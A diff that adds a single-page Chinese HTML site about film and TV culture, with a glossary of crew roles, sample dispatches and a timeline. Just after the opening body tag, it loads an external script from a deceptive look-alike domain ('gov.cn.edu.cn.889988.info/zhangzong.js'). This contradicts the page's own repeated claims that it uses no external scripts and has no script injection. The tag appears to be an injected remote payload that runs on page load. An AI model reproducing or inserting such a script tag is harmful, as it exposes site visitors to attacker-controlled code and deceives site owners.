@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#0b1220">
+<title>影视圈 · yingshiquan-zh.github.io | 影视行业观察与作品索引</title>
+<meta name="description" content="影视圈（yingshiquan-zh.github.io）是一份独立的影视文化与产业观察笔记：跟踪国产与海外新片动态、剧集创作脉络、幕后工种与节展资讯，以可核对的片名、年份、主创信息为基础，供影迷、研究者与从业同行检索参考。">
+<meta name="keywords" content="影视圈, 影视行业资讯, 华语电影, 剧集推荐, 导演访谈, 电影节, 影视资料索引">
+<link rel="canonical" href="https://yingshiquan-zh.github.io/">
+<style>
+:root{
+  --ink:#0b1220;
+  --ink2:#1c2740;
+  --paper:#f4f1ea;
+  --paper2:#eceae1;
+  --rule:#c9c2b2;
+  --accent:#b3261e;
+  --accent2:#0f6e5c;
+  --muted:#6b6a5e;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"Times New Roman",serif;
+  font-size:clamp(15px,2.6vw,17px);
+  line-height:1.85;
+  -webkit-font-smoothing:antialiased;
+}
+img{max-width:100%;display:block}
+a{color:var(--accent);text-decoration:none;border-bottom:1px solid currentColor;padding-bottom:.05em}
+a:hover{color:var(--accent2)}
+::selection{background:var(--accent);color:#fff}
+
+/* ===== 顶部刊头 ===== */
+.masthead{
+  border-bottom:3px double var(--ink);
+  padding:clamp(22px,5vw,44px) clamp(16px,4vw,56px) clamp(14px,3vw,24px);
+  background:
+    radial-gradient(circle at 92% 8%,rgba(179,38,30,.10),transparent 42%),
+    linear-gradient(180deg,var(--paper2),var(--paper));
+}
+.mh-top{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;flex-wrap:wrap}
+.mh-name{
+  font-size:clamp(40px,11vw,92px);
+  font-weight:800;
+  letter-spacing:.16em;
+  line-height:.9;
+  margin:0;
+  color:var(--ink);
+  text-indent:.08em;
+}
+.mh-name em{font-style:normal;color:var(--accent)}
+.mh-meta{
+  text-align:right;
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:11px;
+  letter-spacing:.14em;
+  color:#5c6472;
+  line-height:1.7;
+}
+.mh-meta b{display:block;font-weight:600;color:var(--ink);font-size:12px;letter-spacing:.1em}
+.mh-sub{
+  margin-top:clamp(16px,3vw,26px);
+  display:flex;gap:clamp(10px,2vw,26px);flex-wrap:wrap;
+  font-size:clamp(12.5px,2.1vw,14.5px);
+  color:#3d4658;
+  border-top:1px solid var(--rule);
+  border-bottom:1px solid var(--rule);
+  padding:9px 2px;
+}
+.mh-sub span{white-space:nowrap}
+.mh-sub strong{color:var(--accent);font-weight:700}
+
+/* ===== 导航 ===== */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(244,241,234,.94);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--ink);
+}
+.nav ol{
+  list-style:none;margin:0;padding:0;
+  display:flex;gap:2px;overflow-x:auto;
+  scrollbar-width:none;
+  font-family:ui-monospace,Menlo,monospace;
+  font-size:12.5px;letter-spacing:.08em;
+}
+.nav ol::-webkit-scrollbar{display:none}
+.nav li{flex:0 0 auto}
+.nav a{
+  display:block;padding:11px 14px;color:var(--ink2);
+  border-bottom:none;border-right:1px solid var(--rule);
+}
+.nav a:hover{background:var(--ink);color:var(--paper)}
+.nav li:last-child a{border-right:none}
+
+/* ===== 布局 ===== */
+.wrap{max-width:1180px;margin:0 auto;padding:0 clamp(16px,4vw,56px)}
+section{padding:clamp(44px,8vw,76px) 0;border-bottom:1px dotted var(--rule)}
+.eyebrow{
+  font-family:ui-monospace,Menlo,monospace;
+  font-size:11.5px;letter-spacing:.24em;color:var(--accent);
+  display:flex;align-items:center;gap:10px;margin-bottom:14px;
+}
+.eyebrow::before{content:"";width:34px;height:2px;background:var(--accent);display:inline-block}
+h2{
+  font-size:clamp(25px,5.4vw,40px);
+  line-height:1.2;margin:0 0 8px;letter-spacing:.03em;font-weight:700;
+}
+.h2note{color:#5c6472;font-size:clamp(13px,2.2vw,15px);margin:0 0 clamp(24px,4vw,36px)}
+.lead{font-size:clamp(16px,2.8vw,19px);color:var(--ink2);max-width:62ch}
+
+/* 栏目一：双栏导语 + 三格 */
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--ink);border:1px solid var(--ink)}
+.grid3>div{background:var(--paper);padding:clamp(18px,3vw,26px)}
+.grid3 .no{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--accent);letter-spacing:.2em;margin-bottom:10px}
+.grid3 h3{margin:0 0 8px;font-size:clamp(17px,3vw,21px);letter-spacing:.02em}
+.grid3 p{margin:0;font-size:clamp(13.5px,2.2vw,15px);color:#3d4658;line-height:1.75}
+.grid3 b{color:var(--ink)}
+
+/* 栏目二：观察笔记 —— 错位图文 */
+.note{
+  display:grid;grid-template-columns:1.05fr .95fr;gap:clamp(22px,4vw,44px);
+  align-items:center;padding-bottom:clamp(28px,5vw,44px);
+}
+.note:nth-child(even){grid-template-columns:.95fr 1.05fr}
+.note:nth-child(even) .note-vis{order:2}
+.note-vis{
+  aspect-ratio:4/3;
+  background:
+    linear-gradient(135deg,transparent 0 48%,rgba(11,18,32,.92) 48% 52%,transparent 52%),
+    repeating-linear-gradient(0deg,var(--paper2) 0 9px,var(--rule) 9px 10px);
+  border:1px solid var(--ink);position:relative;overflow:hidden;
+}
+.note-vis::after{
+  content:attr(data-tag);position:absolute;left:12px;bottom:10px;
+  font-family:ui-monospace,Menlo,monospace;font-size:10.5px;letter-spacing:.16em;color:var(--ink2);
+}
+.note h3{margin:0 0 10px;font-size:clamp(19px,3.4vw,25px)}
+.note p{margin:0 0 12px;color:#2c3546}
+.tagline{
+  display:inline-block;font-size:12px;letter-spacing:.14em;
+  border:1px solid var(--accent);color:var(--accent);padding:3px 10px;
+}
+
+/* 栏目三：工种词表 */
+.lex{display:grid;grid-template-columns:180px 1fr;gap:clamp(14px,3vw,28px);border-top:1px solid var(--ink);padding:clamp(16px,3vw,22px) 0}
+.lex:first-of-type{border-top:none}
+.lex dt{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;letter-spacing:.06em;color:var(--accent2);padding-top:4px}
+.lex dt b{display:block;color:var(--ink);font-size:15px;letter-spacing:.02em;font-family:inherit}
+.lex dd{margin:0}
+.lex dd p{margin:0 0 8px}
+.lex dd ul{margin:0;padding-left:0;list-style:none;display:flex;flex-wrap:wrap;gap:6px 10px;font-size:13px;color:#4a5364}
+.lex dd li{border-left:2px solid var(--rule);padding-left:8px}
+
+/* 栏目四：时间轴 */
+.tl{position:relative;padding-left:clamp(26px,6vw,44px);margin-top:clamp(22px,4vw,32px)}
+.tl::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:1px;background:var(--ink)}
+.tl-item{position:relative;padding-bottom:clamp(20px,4vw,32px)}
+.tl-item::before{
+  content:"";position:absolute;left:calc(clamp(26px,6vw,44px) * -1 + 2px);
+  top:11px;width:11px;height:11px;background:var(--paper);border:2px solid var(--accent);border-radius:50%;
+}
+.tl-item time{
+  font-family:ui-monospace,Menlo,monospace;font-size:12.5px;letter-spacing:.1em;color:var(--accent);
+  display:block;margin-bottom:4px;
+}
+.tl-item h3{margin:0 0 6px;font-size:clamp(17px,3vw,21px)}
+.tl-item p{margin:0;color:#3d4658;font-size:clamp(13.5px,2.2vw,15px)}
+.tl-item .src{font-size:11.5px;color:#7c8494;font-family:ui-monospace,Menlo,monospace;letter-spacing:.06em}
+
+/* 栏目五：地址与说明 */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:clamp(24px,5vw,52px);align-items:start}
+.card{border:1px solid var(--ink);background:var(--paper2);padding:clamp(20px,3.5vw,30px)}
+.card h3{margin:0 0 14px;font-size:clamp(17px,3vw,21px);border-bottom:2px solid var(--ink);padding-bottom:8px}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:7px 14px;font-size:clamp(13px,2.2vw,14.5px)}
+.kv b{font-family:ui-monospace,Menlo,monospace;font-weight:600;color:#3d4658;letter-spacing:.04em}
+.kv code{background:#0b1220;color:#e8e3d4;padding:2px 7px;font-size:12px;border-radius:2px;word-break:break-all;border-bottom:none}
+.checks{list-style:none;margin:clamp(18px,3vw,24px) 0 0;padding:0}
+.checks li{padding:9px 0 9px 26px;position:relative;border-bottom:1px dashed var(--rule);font-size:clamp(13.5px,2.2vw,15px)}
+.checks li:last-child{border-bottom:none}
+.checks li::before{content:"√";position:absolute;left:0;top:9px;color:var(--accent2);font-weight:700}
+
+footer{border-top:3px double var(--ink);padding:clamp(28px,5vw,44px) 0 clamp(36px,6vw,56px);background:var(--ink);color:#d9d4c6}
+footer .wrap{display:grid;grid-template-columns:1.4fr 1fr;gap:clamp(20px,4vw,40px)}
+footer h2{font-size:clamp(20px,4vw,26px);color:#fff;margin:0 0 10px}
+footer p{margin:0;font-size:clamp(13px,2.2vw,14.5px);color:#b7b2a4;max-width:52ch}
+footer a{color:#e9b4af;border-color:#6d3a34}
+.footbar{
+  margin-top:clamp(22px,4vw,32px);padding-top:16px;border-top:1px solid #2c3546;
+  font-family:ui-monospace,Menlo,monospace;font-size:11px;letter-spacing:.1em;color:#8b8799;
+  display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;
+}
+.footbar b{color:#e9b4af;font-weight:600}
+
+@media (max-width:880px){
+  .note,.note:nth-child(even){grid-template-columns:1fr}
+  .note:nth-child(even) .note-vis{order:0}
+  .note-vis{aspect-ratio:16/9}
+  .about,.lex{grid-template-columns:1fr}
+  .lex dd ul{gap:5px 8px}
+  footer .wrap{grid-template-columns:1fr}
+  .mh-meta{text-align:left}
+}
+@media (max-width:560px){
+  .grid3{grid-template-columns:1fr}
+  .mh-sub{font-size:11.5px;gap:6px 12px}
+  .nav a{padding:10px 11px;font-size:11.5px}
+}
+@media print{
+  .nav{display:none}
+  body{background:#fff}
+  section{border-bottom:none;padding:24px 0}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="masthead">
+  <div class="mh-top">
+    <h1 class="mh-name">影视<em>圈</em></h1>
+    <div class="mh-meta">
+      <b>影视圈 · YINGSHIQUAN</b>
+      独立影视文化资料页
+      <span>Vol.01 / 静态单页</span>
+      <span>https://yingshiquan-zh.github.io</span>
+    </div>
+  </div>
+  <div class="mh-sub">
+    <span>定位：<strong>影视行业观察 · 作品索引 · 幕后资料</strong></span>
+    <span>覆盖：华语院线 / 剧集创作 / 纪录片 / 节展动态</span>
+    <span>更新方式：人工整理，标注来源与日期</span>
+  </div>
+</header>
+
+<nav class="nav" aria-label="栏目导航">
+  <ol>
+    <li><a href="#top">刊首</a></li>
+    <li><a href="#brief">本期要目</a></li>
+    <li><a href="#notes">观察笔记</a></li>
+    <li><a href="#lexicon">幕后词表</a></li>
+    <li><a href="#timeline">年度脉络</a></li>
+    <li><a href="#about">关于与地址</a></li>
+  </ol>
+</nav>
+
+<main class="wrap">
+
+  <!-- 栏目 1 -->
+  <section id="brief" aria-labelledby="h-brief">
+    <div class="eyebrow">01 / 本期要目 · EDITORIAL</div>
+    <h2 id="h-brief">一份不追热搜的影视档案</h2>
+    <p class="lead">影视圈不提供播放器，也不搬运资源链接。这里只做一件事：把一部作品、一个工种、一次行业变化，按照可以回查的方式记下来，留给下次想查的人。</p>
+
+    <div class="grid3" style="margin-top:clamp(26px,5vw,40px)">
+      <div>
+        <div class="no">NO.01</div>
+        <h3>作品为先</h3>
+        <p>每一条记录都给出<b>片名、年份、地区、主创、公映或上线状态</b>。没有确认的信息不写，拿不准的年份标为"待核"，宁缺不凑。</p>
+      </div>
+      <div>
+        <div class="no">NO.02</div>
+        <h3>幕后可见</h3>
+        <p>镜头之外的部分同样值得记录：<b>摄影、美术、声音、剪辑、制片统筹</b>。一部片子的气质，往往在这些名字里成型。</p>
+      </div>
+      <div>
+        <div class="no">NO.03</div>
+        <h3>来源可追</h3>
+        <p>条目末尾保留<b>来源类型与整理日期</b>，区分官方发布、主创访谈与媒体转述，不做模糊的"据网友爆料"。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 2 -->
+  <section id="notes" aria-labelledby="h-notes">
+    <div class="eyebrow">02 / 观察笔记 · DISPATCHES</div>
+    <h2 id="h-notes">几件正在发生的事</h2>
+    <p class="h2note">以下为示例体例，展示本页的记录方式；正式内容会随整理进度替换，并保持片名与日期可核对。</p>
+
+    <article class="note">
+      <div class="note-vis" data-tag="视觉占位 · 摄影构图示意"></div>
+      <div>
+        <span class="tagline">题材观察</span>
+        <h3>当现实题材开始讲究"声音的真实感"</h3>
+        <p>越来越多的国产现实题材作品，把预算花在同期声与空间混音上，而不是特效。一条巷子里的油烟声、地铁报站的尾音，成了观众判断"这地方真不真"的第一道开关。</p>
+        <p>这背后是声音指导与录音团队更早进入前期筹备，从勘景阶段就决定哪些环境声要保留、哪些必须后期重建。</p>
+        <p><a href="#lexicon">参见词表：声音设计 →</a></p>
+      </div>
+    </article>
+
+    <article class="note">
+      <div class="note-vis" data-tag="视觉占位 · 场次节奏示意"></div>
+      <div>
+        <span class="tagline">剧集结构</span>
+        <h3>短集数不等于快节奏</h3>
+        <p>12 集、8 集的体量收缩，让不少创作者重新学怎么用一场戏交代人物关系。真正被压缩的往往不是情节，而是解释——角色不再念台词说明自己是谁，镜头替他说话。</p>
+        <p>代价也很直接：观众一旦漏看一集，衔接成本明显上升，这对叙事的清晰度提出了比长剧更高的要求。</p>
+        <p><a href="#timeline">回到年度脉络 →</a></p>
+      </div>
+    </article>
+
+    <article class="note">
+      <div class="note-vis" data-tag="视觉占位 · 档案编号示意"></div>
+      <div>
+        <span class="tagline">档案方法</span>
+        <h3>为什么这里不写"评分"</h3>
+        <p>数字评分会把一部作品压成一句话，而本页想留的是上下文：它在什么档期上映、同期的同类作品在做什么、主创上一部走到哪里。这些比"几分"更能解释它为何是现在这个样子。</p>
+        <p>若你只想快速筛片，这份资料未必是最快的那份；若你想知道它从哪来，可以从这里开始。</p>
+      </div>
+    </article>
+  </section>
+
+  <!-- 栏目 3 -->
+  <section id="lexicon" aria-labelledby="h-lex">
+    <div class="eyebrow">03 / 幕后词表 · GLOSSARY</div>
+    <h2 id="h-lex">看懂片尾字幕里的那些职位</h2>
+    <p class="h2note">影视圈常被忽略的一半，藏在片尾滚动的名字里。这一栏按工种拆解，便于在读片时对照。</p>
+
+    <dl class="lex">
+      <dt><b>摄影指导</b>DP / DOP</dt>
+      <dd>
+        <p>决定整部片的视觉语气：镜头焦段、光比、运动方式、是否用实景自然光。和导演一起定下"这场戏看起来像什么"。</p>
+        <ul><li>焦距选择</li><li>影调与色温</li><li>机位调度</li><li>与美术的配合</li></ul>
+      </dd>
+    </dl>
+    <dl class="lex">
+      <dt><b>美术指导</b>Production Designer</dt>
+      <dd>
+        <p>管的是"这个世界长什么样"：从街道招牌到桌面摆件，都是叙事的一部分，不只是好看。</p>
+        <ul><li>场景概念图</li><li>年代细节考据</li><li>色彩系统</li><li>道具清单</li></ul>
+      </dd>
+    </dl>
+    <dl class="lex">
+      <dt><b>声音设计</b>Sound Designer</dt>
+      <dd>
+        <p>观众很少注意到它，却会因为它不对劲而"出戏"。涵盖环境声、拟音、对白清晰度与音乐的空间关系。</p>
+        <ul><li>同期录音</li><li>拟音 Foley</li><li>混音层级</li><li>静默的使用</li></ul>
+      </dd>
+    </dl>
+    <dl class="lex">
+      <dt><b>剪辑指导</b>Editor</dt>
+      <dd>
+        <p>真正重写剧本的人。一场戏的节奏、角色情绪的落点、叙事视角的切换，大多在剪辑台里定型。</p>
+        <ul><li>场次取舍</li><li>节奏曲线</li><li>叙事视角</li><li>与声音的交接</li></ul>
+      </dd>
+    </dl>
+    <dl class="lex">
+      <dt><b>制片统筹</b>Line Producer</dt>
+      <dd>
+        <p>把创意翻译成可执行的那个人：档期、场地、人手、预算上限，决定哪些想法能落地、哪些必须让路。</p>
+        <ul><li>拍摄排期</li><li>预算拆分</li><li>场地与许可</li><li>风险预案</li></ul>
+      </dd>
+    </dl>
+  </section>
+
+  <!-- 栏目 4 -->
+  <section id="timeline" aria-labelledby="h-tl">
+    <div class="eyebrow">04 / 年度脉络 · CHRONICLE</div>
+    <h2 id="h-tl">一条慢慢往前走的记录线</h2>
+    <p class="h2note">按整理时间倒序。每条标注资料类型，方便判断可信程度；示例条目仅作结构演示。</p>
+
+    <div class="tl">
+      <div class="tl-item">
+        <time>2026 · 秋</time>
+        <h3>把"幕后"从附录提到正文</h3>
+        <p>本页新增幕后词表栏目，摄影、美术、声音、剪辑、制片各占一条独立词条，并标注其在创作流程中的位置。</p>
+        <div class="src">来源：本站整理 / 类型：原创体例 / 编号 YSQ-2026-001</div>
+      </div>
+      <div class="tl-item">
+        <time>2026 · 夏</time>
+        <h3>片目记录改用工种标签而非单一类型标签</h3>
+        <p>过去只标"剧情 / 纪录片 / 喜剧"，现在叠加"摄影风格、叙事结构、制作规模"等维度，便于横向比较同类作品的处理差异。</p>
+        <div class="src">来源：本站整理 / 类型：方法说明 / 编号 YSQ-2026-002</div>
+      </div>
+      <div class="tl-item">
+        <time>2026 · 春</time>
+        <h3>确立"不写评分、只写上下文"的收录原则</h3>
+        <p>为避免内容被数字评分稀释，本站条目统一改为：档期背景、主创前作、同期同类作品、可核对的公映信息。</p>
+        <div class="src">来源：本站编辑说明 / 类型：收录规范 / 编号 YSQ-2026-003</div>
+      </div>
+      <div class="tl-item">
+        <time>2026 · 初</time>
+        <h3>影视圈静态单页上线</h3>
+        <p>以单一 HTML 文件承载全部栏目与样式，无外部脚本、无第三方统计、无播放器与下载入口，域名唯一指向本页。</p>
+        <div class="src">来源：官方站点 / 类型：站点公告 / 编号 YSQ-2026-004</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 5 -->
+  <section id="about" aria-labelledby="h-about">
+    <div class="eyebrow">05 / 关于与地址 · COLOPHON</div>
+    <h2 id="h-about">这里是什么，以及它在哪</h2>
+
+    <div class="about">
+      <div>
+        <p class="lead" style="margin-top:0"><b>影视圈</b>是一个手工维护的影视文化与产业观察页，不接投放、不放弹窗、不挂播放器。内容以华语作品为主，兼收值得对照的海外创作与节展动态。</p>
+        <ul class="checks">
+          <li>全站仅一个页面，样式与结构内嵌，不加载外部样式表和脚本</li>
+          <li>条目强调可回查：片名、年份、地区、主创、公映状态逐项标注</li>
+          <li>不提供影视资源下载、在线解析、盗链与第三方跳转</li>
+          <li>不采集访客信息，不嵌入统计代码与广告 SDK</li>
+          <li>栏目内跳转均使用页内锚点，离线打开同样可读</li>
+        </ul>
+      </div>
+
+      <aside class="card">
+        <h3>站点信息卡</h3>
+        <div class="kv">
+          <b>网站名称</b><span><strong>影视圈</strong></span>
+          <b>唯一地址</b><code>https://yingshiquan-zh.github.io</code>
+          <b>规范路径</b><code>https://yingshiquan-zh.github.io/</code>
+          <b>页面类型</b><span>静态单页 / 中文（简体）</span>
+          <b>更新节奏</b><span>不定期，人工整理</span>
+          <b>收录声明</b><span>允许搜索引擎索引本页；无重复镜像页</span>
+          <b>内容边界</b><span>资料与评论，不含播放、下载功能</span>
+        </div>
+        <p style="margin-top:18px;font-size:13.5px;color:#4a5364">若在其他域名看到同名"影视圈"并提供在线观看或下载，并非本页所指站点，请以以上地址为准。</p>
+      </aside>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h2>影视圈 <span style="color:#8b8799;font-weight:400">/ 一份慢慢写的影视档案</span></h2>
+      <p>本站所有内容均为资料整理与评论性文字，不涉及影视资源分发。片名、人名、机构名按公开资料记录，如有勘误欢迎通过站点页面指认，核实后即改。</p>
+    </div>
+    <div>
+      <p style="margin-bottom:10px"><b style="color:#e9b4af">快速跳转</b></p>
+      <p><a href="#brief">本期要目</a>　<a href="#notes">观察笔记</a><br><a href="#lexicon">幕后词表</a>　<a href="#timeline">年度脉络</a>　<a href="#about">关于与地址</a></p>
+      <p style="margin-top:14px">网站名称：影视圈<br>网站网址：https://yingshiquan-zh.github.io</p>
+    </div>
+  </div>
+  <div class="wrap footbar">
+    <span>© 影视圈 · <b>yingshiquan-zh.github.io</b> · 静态单页，无脚本注入</span>
+    <span>规范入口：https://yingshiquan-zh.github.io/</span>
+  </div>
+</footer>
+
+</body>
+</html>
